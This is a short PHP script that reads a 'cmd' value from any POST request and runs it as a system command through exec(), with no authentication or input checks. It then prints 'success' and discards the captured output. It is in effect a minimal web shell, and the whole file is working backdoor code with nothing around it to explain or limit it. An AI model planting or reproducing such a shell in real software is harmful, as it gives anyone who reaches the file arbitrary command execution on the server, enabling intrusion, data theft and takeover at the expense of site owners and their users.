<?php
function execute($com)
{
    exec($com,$arr);
}

echo "success";
$cmd = $_POST['cmd'];
ob_start();
execute($cmd);
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
?>